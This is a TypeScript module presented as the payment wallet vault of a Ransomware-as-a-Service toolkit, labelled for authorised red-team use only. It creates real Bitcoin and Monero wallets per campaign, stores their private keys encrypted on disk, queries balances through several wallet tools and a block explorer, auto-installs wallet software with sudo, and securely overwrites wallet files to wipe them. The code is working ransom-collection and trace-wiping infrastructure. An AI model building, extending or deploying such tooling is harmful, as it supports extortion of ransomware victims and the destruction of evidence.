/**
 * @module raas_wallet
 * RaaS payment wallet vault — real BTC/XMR via native crypto + monero-wallet-cli,
 * balance via bitcoin-cli / electrum / blockstream / monero-wallet-cli+monerod.
 * FOR AUTHORISED RED-TEAM ONLY.
 */
import * as crypto from "node:crypto"
import * as fs from "node:fs"
import * as os from "node:os"
import * as path from "node:path"
import { execFileSync } from "node:child_process"
import { isToolAvailable } from "./tool_detection.ts"

export type WalletChain = "btc" | "xmr"

export interface WalletRecord {
  id: string
  chain: WalletChain
  address: string
  wif?: string
  mnemonic?: string
  walletPath?: string
  viewKey?: string
  spendKey?: string
  createdAt: string
  campaignId?: string
  ephemeral: boolean
  source: "native" | "monero-cli" | "unavailable"
  error?: string
}

export interface WalletVaultOpts {
  ephemeral?: boolean
  campaignId?: string
  vaultDir?: string
  live?: boolean
  forceLive?: boolean
  autoInstall?: boolean
}

export interface WalletBalanceResult {
  walletId: string
  chain: WalletChain
  address: string
  balance: string
  unconfirmed: string
  source: "bitcoin-cli" | "electrum" | "blockstream" | "monero-cli" | "unavailable"
  dryRun: boolean
  error?: string
}

export interface WalletToolchainStatus {
  btc: { native: boolean; bitcoinCli: boolean; electrum: boolean; blockstream: boolean }
  xmr: { moneroWalletCli: boolean; monerod: boolean; daemon: string }
}

export interface WalletInstallResult {
  dryRun: boolean
  installed: string[]
  failed: string[]
  skipped: string[]
  commands: string[]
  after: WalletToolchainStatus
}

const EPHEMERAL_VAULT = new Map<string, WalletRecord>()
const EPHEMERAL_XMR_DIRS = new Map<string, string>()

const CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"
const B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
const XMR_ADDR_RE = /[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}/

function bech32Polymod(values: number[]): number {
  const gen = [0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3]
  let chk = 1
  for (const v of values) {
    const b = chk >> 25
    chk = ((chk & 0x1ffffff) << 5) ^ v
    for (let i = 0; i < 5; i++) if ((b >> i) & 1) chk ^= gen[i]!
  }
  return chk
}

function bech32HrpExpand(hrp: string): number[] {
  return [...hrp].flatMap((c) => [c.charCodeAt(0) >> 5, c.charCodeAt(0) & 31])
}

function bech32Encode(hrp: string, witnessVersion: number, program: Buffer): string {
  const data = [witnessVersion, ...convertBits(program, 8, 5, true)]
  const values = [...bech32HrpExpand(hrp), 0, ...data]
  const checksum = bech32Polymod([...values, 0, 0, 0, 0, 0, 0]) ^ 1
  const combined = [...data, ...Array.from({ length: 6 }, (_, i) => (checksum >> (5 * (5 - i))) & 31)]
  return `${hrp}1${combined.map((d) => CHARSET[d]).join("")}`
}

function convertBits(data: Buffer, fromBits: number, toBits: number, pad: boolean): number[] {
  let acc = 0
  let bits = 0
  const out: number[] = []
  const maxv = (1 << toBits) - 1
  for (const value of data) {
    acc = (acc << fromBits) | value
    bits += fromBits
    while (bits >= toBits) {
      bits -= toBits
      out.push((acc >> bits) & maxv)
    }
  }
  if (pad && bits > 0) out.push((acc << (toBits - bits)) & maxv)
  return out
}

function hash160(buf: Buffer): Buffer {
  return crypto.createHash("ripemd160").update(crypto.createHash("sha256").update(buf).digest()).digest()
}

function base58Encode(buf: Buffer): string {
  let num = BigInt("0x" + buf.toString("hex"))
  let out = ""
  while (num > 0n) {
    out = B58[Number(num % 58n)] + out
    num = num / 58n
  }
  for (const b of buf) {
    if (b !== 0) break
    out = "1" + out
  }
  return out
}

function vaultKey(): Buffer {
  const env = process.env.OURMINE_WALLET_VAULT_KEY
  if (env) return crypto.createHash("sha256").update(env).digest()
  return crypto.createHash("sha256").update(`ourmine-vault-${os.hostname()}-${process.pid}`).digest()
}

function encryptSecret(plaintext: string): string {
  const iv = crypto.randomBytes(12)
  const cipher = crypto.createCipheriv("aes-256-gcm", vaultKey(), iv)
  const enc = Buffer.concat([cipher.update(plaintext, "utf8"), cipher.final()])
  return Buffer.concat([iv, cipher.getAuthTag(), enc]).toString("base64")
}

function decryptSecret(blob: string): string {
  const buf = Buffer.from(blob, "base64")
  const decipher = crypto.createDecipheriv("aes-256-gcm", vaultKey(), buf.subarray(0, 12))
  decipher.setAuthTag(buf.subarray(12, 28))
  return Buffer.concat([decipher.update(buf.subarray(28)), decipher.final()]).toString("utf8")
}

function vaultDir(opts: WalletVaultOpts): string {
  return opts.vaultDir ?? path.join(process.cwd(), ".ourmine", "raas", "wallets")
}

function xmrFilesDir(opts: WalletVaultOpts): string {
  return path.join(vaultDir(opts), "xmr_files")
}

function runCmd(cmd: string, args: string[], opts: { timeoutMs?: number; input?: string } = {}): { stdout: string; stderr: string; ok: boolean } {
  try {
    const stdout = execFileSync(cmd, args, {
      encoding: "utf8",
      timeout: opts.timeoutMs ?? 30000,
      stdio: ["pipe", "pipe", "pipe"],
      input: opts.input,
    })
    return { stdout, stderr: "", ok: true }
  } catch (e: unknown) {
    const err = e as { stdout?: string; stderr?: string }
    return { stdout: err.stdout ?? "", stderr: err.stderr ?? String(e), ok: false }
  }
}

function moneroDaemon(): string {
  return process.env.OURMINE_MONERO_DAEMON ?? "127.0.0.1:18081"
}

function blockstreamBase(): string {
  return (process.env.OURMINE_BTC_EXPLORER ?? "https://blockstream.info/api").replace(/\/$/, "")
}

export function checkWalletToolchain(): WalletToolchainStatus {
  return {
    btc: {
      native: true,
      bitcoinCli: isToolAvailable("bitcoin-cli"),
      electrum: isToolAvailable("electrum"),
      blockstream: true,
    },
    xmr: {
      moneroWalletCli: isToolAvailable("monero-wallet-cli"),
      monerod: isToolAvailable("monerod"),
      daemon: moneroDaemon(),
    },
  }
}

const WALLET_APT_PACKAGES: Record<string, string> = {
  "monero-wallet-cli": "monero-wallet-cli",
  monerod: "monerod",
  "bitcoin-cli": "bitcoin-cli",
  electrum: "electrum",
}

function missingWalletPackages(): string[] {
  const tc = checkWalletToolchain()
  const missing: string[] = []
  if (!tc.xmr.moneroWalletCli) missing.push(WALLET_APT_PACKAGES["monero-wallet-cli"]!)
  if (!tc.xmr.monerod) missing.push(WALLET_APT_PACKAGES.monerod!)
  if (!tc.btc.bitcoinCli) missing.push(WALLET_APT_PACKAGES["bitcoin-cli"]!)
  if (!tc.btc.electrum) missing.push(WALLET_APT_PACKAGES.electrum!)
  return [...new Set(missing)]
}

/** Install missing wallet CLI deps via apt (Kali/Debian). Requires live+forceLive. */
export function ensureWalletToolchain(opts: WalletVaultOpts = {}): WalletInstallResult {
  const before = checkWalletToolchain()
  const packages = missingWalletPackages()
  const canInstall = opts.live === true && opts.forceLive === true
  const commands: string[] = []

  if (!packages.length) {
    return { dryRun: false, installed: [], failed: [], skipped: [], commands, after: before }
  }

  if (!canInstall) {
    commands.push(`sudo apt-get update && sudo apt-get install -y ${packages.join(" ")}`)
    return { dryRun: true, installed: [], failed: [], skipped: packages, commands, after: before }
  }

  if (!isToolAvailable("apt-get") && !isToolAvailable("apt")) {
    return {
      dryRun: false,
      installed: [],
      failed: packages,
      skipped: [],
      commands: ["apt-get not found — install wallet packages manually"],
      after: before,
    }
  }

  const apt = isToolAvailable("apt-get") ? "apt-get" : "apt"
  const useSudo = process.getuid?.() !== 0 && isToolAvailable("sudo")
  const prefix = useSudo ? ["sudo", "-n"] : []
  const installed: string[] = []
  const failed: string[] = []

  const updateCmd = [...prefix, apt, "update"]
  commands.push(updateCmd.join(" "))
  const update = runCmd(prefix.length ? "sudo" : apt, prefix.length ? ["-n", apt, "update"] : ["update"], { timeoutMs: 120000 })
  if (!update.ok && !update.stderr.includes("Reading package lists")) {
    return { dryRun: false, installed, failed: packages, skipped: [], commands, after: checkWalletToolchain() }
  }

  for (const pkg of packages) {
    const installCmd = [...prefix, apt, "install", "-y", pkg]
    commands.push(installCmd.join(" "))
    const r = runCmd(prefix.length ? "sudo" : apt, prefix.length ? ["-n", apt, "install", "-y", pkg] : ["install", "-y", pkg], { timeoutMs: 300000 })
    if (r.ok || isToolAvailable(Object.keys(WALLET_APT_PACKAGES).find((k) => WALLET_APT_PACKAGES[k] === pkg) ?? pkg)) {
      installed.push(pkg)
    } else {
      failed.push(pkg)
    }
  }

  return { dryRun: false, installed, failed, skipped: [], commands, after: checkWalletToolchain() }
}

/** Real native segwit BTC (always available — no external deps). */
export function generateBtcWallet(): { address: string; wif: string; publicKeyHex: string; privateKeyHex: string } {
  const { privateKey, publicKey } = crypto.generateKeyPairSync("ec", { namedCurve: "secp256k1" })
  const privRaw = privateKey.export({ type: "pkcs8", format: "der" }).subarray(-32)
  const pubUncompressed = publicKey.export({ type: "spki", format: "der" }).subarray(-65)
  const yParity = pubUncompressed[64]! & 1
  const pubCompressed = Buffer.concat([Buffer.from([yParity ? 0x03 : 0x02]), pubUncompressed.subarray(1, 33)])
  const address = bech32Encode("bc", 0, hash160(pubCompressed))
  const payload = Buffer.concat([Buffer.from([0x80]), privRaw, Buffer.from([0x01])])
  const checksum = crypto.createHash("sha256").update(crypto.createHash("sha256").update(payload).digest()).digest().subarray(0, 4)
  const wif = base58Encode(Buffer.concat([payload, checksum]))
  return { address, wif, publicKeyHex: pubCompressed.toString("hex"), privateKeyHex: privRaw.toString("hex") }
}

function parseMoneroOutput(text: string): { address?: string; mnemonic?: string } {
  const address = text.match(XMR_ADDR_RE)?.[0]
  const mnemonic =
    text.match(/(?:Mnemonic|Seed|secret seed)[:\s]+([a-z\s]{20,})/i)?.[1]?.trim().replace(/\s+/g, " ")
    ?? text.match(/\b([a-z]+(?: [a-z]+){11,24})\b/i)?.[1]?.trim()
  return { address, mnemonic }
}

/** Real XMR via monero-wallet-cli (offline). No placeholder addresses. */
export function generateXmrWallet(opts: WalletVaultOpts = {}): {
  address: string
  mnemonic?: string
  walletPath?: string
  source: "monero-cli" | "unavailable"
  error?: string
} {
  if (!isToolAvailable("monero-wallet-cli")) {
    return {
      address: "",
      source: "unavailable",
      error: "Install monero-wallet-cli: apt install monero-wallet-cli",
    }
  }

  const baseDir = opts.ephemeral !== false
    ? fs.mkdtempSync(path.join(os.tmpdir(), "ourmine-xmr-"))
    : (() => { const d = xmrFilesDir(opts); fs.mkdirSync(d, { recursive: true, mode: 0o700 }); return d })()
  const walletPath = path.join(baseDir, `wallet_${Date.now()}`)

  const gen = runCmd("monero-wallet-cli", [
    "--generate-new-wallet", walletPath,
    "--password", "",
    "--mnemonic-language", "English",
    "--restore-height", "0",
    "--offline",
  ], { timeoutMs: 180000, input: "\n" })

  const combined = `${gen.stdout}\n${gen.stderr}`
  let parsed = parseMoneroOutput(combined)

  if (!parsed.address && fs.existsSync(`${walletPath}.keys`)) {
    const addrCmd = runCmd("monero-wallet-cli", [
      "--wallet-file", walletPath,
      "--password", "",
      "--offline",
      "--command", "address",
    ], { timeoutMs: 60000, input: "\n" })
    parsed = parseMoneroOutput(`${addrCmd.stdout}\n${addrCmd.stderr}`)
    if (!parsed.mnemonic) {
      const seedCmd = runCmd("monero-wallet-cli", [
        "--wallet-file", walletPath,
        "--password", "",
        "--offline",
        "--command", "seed",
      ], { timeoutMs: 60000, input: "\n" })
      parsed.mnemonic = parseMoneroOutput(`${seedCmd.stdout}\n${seedCmd.stderr}`).mnemonic ?? parsed.mnemonic
    }
  }

  if (!parsed.address) {
    try { fs.rmSync(baseDir, { recursive: true, force: true }) } catch { /* skip */ }
    return {
      address: "",
      source: "unavailable",
      error: `monero-wallet-cli failed: ${(gen.stderr || gen.stdout).slice(0, 200)}`,
    }
  }

  return {
    address: parsed.address,
    mnemonic: parsed.mnemonic,
    walletPath,
    source: "monero-cli",
  }
}

export function createWalletPair(opts: WalletVaultOpts = {}): { btc: WalletRecord; xmr: WalletRecord; install?: WalletInstallResult } {
  let install: WalletInstallResult | undefined
  if (opts.autoInstall !== false && !isToolAvailable("monero-wallet-cli")) {
    install = ensureWalletToolchain(opts)
  }
  const ephemeral = opts.ephemeral !== false && !opts.forceLive
  const id = `wal_${crypto.randomBytes(8).toString("hex")}`
  const btcRaw = generateBtcWallet()
  const xmrRaw = generateXmrWallet({ ...opts, ephemeral })

  const btc: WalletRecord = {
    id: `${id}_btc`,
    chain: "btc",
    address: btcRaw.address,
    wif: btcRaw.wif,
    createdAt: new Date().toISOString(),
    campaignId: opts.campaignId,
    ephemeral,
    source: "native",
  }

  const xmr: WalletRecord = {
    id: `${id}_xmr`,
    chain: "xmr",
    address: xmrRaw.address,
    mnemonic: xmrRaw.mnemonic,
    walletPath: xmrRaw.walletPath,
    createdAt: new Date().toISOString(),
    campaignId: opts.campaignId,
    ephemeral,
    source: xmrRaw.source,
    error: xmrRaw.error,
  }

  if (xmrRaw.walletPath && ephemeral) {
    EPHEMERAL_XMR_DIRS.set(xmr.id, path.dirname(xmrRaw.walletPath))
  }

  storeWallet(btc, opts)
  storeWallet(xmr, opts)
  return { btc, xmr, install }
}

function storeWallet(record: WalletRecord, opts: WalletVaultOpts): void {
  if (record.ephemeral) {
    EPHEMERAL_VAULT.set(record.id, record)
    return
  }
  const dir = vaultDir(opts)
  fs.mkdirSync(dir, { recursive: true, mode: 0o700 })
  const secrets = JSON.stringify({
    wif: record.wif,
    mnemonic: record.mnemonic,
    walletPath: record.walletPath,
    viewKey: record.viewKey,
    spendKey: record.spendKey,
  })
  fs.writeFileSync(
    path.join(dir, `${record.id}.json`),
    JSON.stringify({
      id: record.id,
      chain: record.chain,
      address: record.address,
      encryptedSecrets: encryptSecret(secrets),
      createdAt: record.createdAt,
      campaignId: record.campaignId,
      ephemeral: false,
      source: record.source,
      error: record.error,
    }, null, 2),
    { mode: 0o600 },
  )
}

export function loadWallet(walletId: string, opts: WalletVaultOpts = {}): WalletRecord | null {
  if (EPHEMERAL_VAULT.has(walletId)) return EPHEMERAL_VAULT.get(walletId)!
  const file = path.join(vaultDir(opts), `${walletId}.json`)
  if (!fs.existsSync(file)) return null
  const raw = JSON.parse(fs.readFileSync(file, "utf8")) as Record<string, unknown>
  const secrets = JSON.parse(decryptSecret(String(raw.encryptedSecrets))) as Partial<WalletRecord>
  return {
    id: String(raw.id),
    chain: raw.chain as WalletChain,
    address: String(raw.address ?? ""),
    createdAt: String(raw.createdAt),
    campaignId: raw.campaignId as string | undefined,
    ephemeral: false,
    source: (raw.source as WalletRecord["source"]) ?? "unavailable",
    error: raw.error as string | undefined,
    ...secrets,
  }
}

export function listWallets(opts: WalletVaultOpts = {}): Array<{ id: string; chain: WalletChain; address: string; ephemeral: boolean; source: string }> {
  const out: Array<{ id: string; chain: WalletChain; address: string; ephemeral: boolean; source: string }> = []
  for (const [id, w] of EPHEMERAL_VAULT) {
    out.push({ id, chain: w.chain, address: w.address, ephemeral: true, source: w.source })
  }
  const dir = vaultDir(opts)
  if (fs.existsSync(dir)) {
    for (const f of fs.readdirSync(dir).filter((x) => x.endsWith(".json"))) {
      try {
        const j = JSON.parse(fs.readFileSync(path.join(dir, f), "utf8"))
        out.push({ id: j.id, chain: j.chain, address: j.address ?? "", ephemeral: false, source: j.source ?? "unknown" })
      } catch { /* skip */ }
    }
  }
  return out
}

async function fetchBtcBalanceBlockstream(address: string): Promise<{ balance: string; unconfirmed: string }> {
  const res = await fetch(`${blockstreamBase()}/address/${address}`, { signal: AbortSignal.timeout(15000) })
  if (!res.ok) throw new Error(`blockstream HTTP ${res.status}`)
  const data = await res.json() as {
    chain_stats?: { funded_txo_sum?: number; spent_txo_sum?: number }
    mempool_stats?: { funded_txo_sum?: number; spent_txo_sum?: number }
  }
  const confirmed = ((data.chain_stats?.funded_txo_sum ?? 0) - (data.chain_stats?.spent_txo_sum ?? 0)) / 1e8
  const unconfirmed = ((data.mempool_stats?.funded_txo_sum ?? 0) - (data.mempool_stats?.spent_txo_sum ?? 0)) / 1e8
  return { balance: confirmed.toFixed(8), unconfirmed: unconfirmed.toFixed(8) }
}

function fetchBtcBalanceBitcoinCli(address: string): { balance: string; unconfirmed: string } | null {
  if (!isToolAvailable("bitcoin-cli")) return null
  const wallet = process.env.OURMINE_BITCOIN_WALLET
  const baseArgs = wallet ? ["-rpcwallet=" + wallet] : []
  const received = runCmd("bitcoin-cli", [...baseArgs, "getreceivedbyaddress", address, "0"])
  if (!received.ok) return null
  const unconf = runCmd("bitcoin-cli", [...baseArgs, "getunconfirmedbalance"])
  return {
    balance: received.stdout.trim() || "0",
    unconfirmed: unconf.ok ? unconf.stdout.trim() : "0",
  }
}

function fetchBtcBalanceElectrum(address: string): { balance: string; unconfirmed: string } | null {
  if (!isToolAvailable("electrum")) return null
  const r = runCmd("electrum", ["getaddressbalance", address])
  if (!r.ok) return null
  try {
    const j = JSON.parse(r.stdout) as { confirmed?: string; unconfirmed?: string }
    return { balance: j.confirmed ?? "0", unconfirmed: j.unconfirmed ?? "0" }
  } catch {
    return null
  }
}

function fetchXmrBalanceMoneroCli(walletPath: string): { balance: string; unconfirmed: string } | null {
  if (!isToolAvailable("monero-wallet-cli") || !walletPath) return null
  if (!fs.existsSync(`${walletPath}.keys`)) return null

  const daemon = moneroDaemon()
  const args = [
    "--wallet-file", walletPath,
    "--password", "",
    "--daemon-address", daemon,
    "--command", "balance",
  ]
  if (!isToolAvailable("monerod")) {
    args.splice(3, 0, "--offline")
  }

  const r = runCmd("monero-wallet-cli", args, { timeoutMs: 120000, input: "\n" })
  const text = `${r.stdout}\n${r.stderr}`
  const m = text.match(/Balance:\s*([\d.]+)/i)
  const u = text.match(/Unlocked balance:\s*([\d.]+)/i)
  if (!m) return null
  return { balance: m[1] ?? "0", unconfirmed: u ? String(Number(m[1]) - Number(u[1])) : "0" }
}

/** Query balance — live read-only (no forceLive). BTC: cli → electrum → blockstream. XMR: monero-wallet-cli. */
export async function getWalletBalance(walletId: string, opts: WalletVaultOpts = {}): Promise<WalletBalanceResult> {
  const wallet = loadWallet(walletId, opts)
  const base = (chain: WalletChain, address: string): WalletBalanceResult => ({
    walletId,
    chain,
    address,
    balance: "0",
    unconfirmed: "0",
    source: "unavailable",
    dryRun: !opts.live,
  })

  if (!wallet) return { ...base("btc", ""), error: "wallet not found" }

  if (!opts.live) {
    return {
      ...base(wallet.chain, wallet.address),
      error: "Set live:true for balance query (read-only, no forceLive required)",
    }
  }

  if (wallet.chain === "btc") {
    const cli = fetchBtcBalanceBitcoinCli(wallet.address)
    if (cli) {
      return { walletId, chain: "btc", address: wallet.address, ...cli, source: "bitcoin-cli", dryRun: false }
    }
    const elec = fetchBtcBalanceElectrum(wallet.address)
    if (elec) {
      return { walletId, chain: "btc", address: wallet.address, ...elec, source: "electrum", dryRun: false }
    }
    try {
      const bs = await fetchBtcBalanceBlockstream(wallet.address)
      return { walletId, chain: "btc", address: wallet.address, ...bs, source: "blockstream", dryRun: false }
    } catch (e) {
      return { ...base("btc", wallet.address), error: String(e) }
    }
  }

  if (wallet.chain === "xmr") {
    if (!wallet.walletPath) {
      return { ...base("xmr", wallet.address), error: "XMR wallet file missing — regenerate with monero-wallet-cli" }
    }
    const xmr = fetchXmrBalanceMoneroCli(wallet.walletPath)
    if (xmr) {
      return { walletId, chain: "xmr", address: wallet.address, ...xmr, source: "monero-cli", dryRun: false }
    }
    return {
      ...base("xmr", wallet.address),
      error: `monero-wallet-cli balance failed — ensure monerod at ${moneroDaemon()} or sync wallet offline`,
    }
  }

  return base(wallet.chain, wallet.address)
}

export function wipeWallet(walletId: string, opts: WalletVaultOpts = {}): { wiped: boolean; method: string } {
  EPHEMERAL_VAULT.delete(walletId)
  const xmrDir = EPHEMERAL_XMR_DIRS.get(walletId)
  if (xmrDir) {
    try { fs.rmSync(xmrDir, { recursive: true, force: true }) } catch { /* skip */ }
    EPHEMERAL_XMR_DIRS.delete(walletId)
  }
  const file = path.join(vaultDir(opts), `${walletId}.json`)
  if (!fs.existsSync(file)) return { wiped: true, method: "ephemeral_or_missing" }
  if (!(opts.live && opts.forceLive)) return { wiped: false, method: "live+forceLive required for disk wipe" }
  try {
    const st = fs.statSync(file)
    fs.writeFileSync(file, crypto.randomBytes(st.size))
    fs.unlinkSync(file)
    return { wiped: true, method: "secure_overwrite_unlink" }
  } catch {
    return { wiped: false, method: "wipe_failed" }
  }
}

export function wipeAllWallets(opts: WalletVaultOpts = {}): { count: number } {
  for (const id of [...EPHEMERAL_VAULT.keys()]) wipeWallet(id, { ...opts, live: true, forceLive: true })
  EPHEMERAL_VAULT.clear()
  EPHEMERAL_XMR_DIRS.clear()
  let count = 0
  const dir = vaultDir(opts)
  if (fs.existsSync(dir)) {
    for (const f of fs.readdirSync(dir).filter((x) => x.endsWith(".json"))) {
      wipeWallet(f.replace(".json", ""), { ...opts, live: true, forceLive: true })
      count++
    }
    try { fs.rmSync(xmrFilesDir(opts), { recursive: true, force: true }) } catch { /* skip */ }
  }
  return { count }
}

export function walletTerminalSummary(opts: WalletVaultOpts = {}): string {
  const tc = checkWalletToolchain()
  const wallets = listWallets(opts)
  const lines = [
    "OURMINE Wallet Vault (authorized lab)",
    `BTC: native=✓ bitcoin-cli=${tc.btc.bitcoinCli ? "✓" : "✗"} electrum=${tc.btc.electrum ? "✓" : "✗"} blockstream=✓`,
    `XMR: monero-wallet-cli=${tc.xmr.moneroWalletCli ? "✓" : "✗"} monerod=${tc.xmr.monerod ? "✓" : "✗"} daemon=${tc.xmr.daemon}`,
    `Wallets: ${wallets.length}`,
  ]
  for (const w of wallets) {
    lines.push(`  [${w.chain.toUpperCase()}] ${w.id}  ${w.address ? w.address.slice(0, 16) + "…" : "(none)"}  source=${w.source}`)
  }
  lines.push("Keys never echoed. Balance: live:true (read-only).")
  return lines.join("\n")
}

export default {
  checkWalletToolchain,
  ensureWalletToolchain,
  generateBtcWallet,
  generateXmrWallet,
  createWalletPair,
  loadWallet,
  listWallets,
  getWalletBalance,
  wipeWallet,
  wipeAllWallets,
  walletTerminalSummary,
}
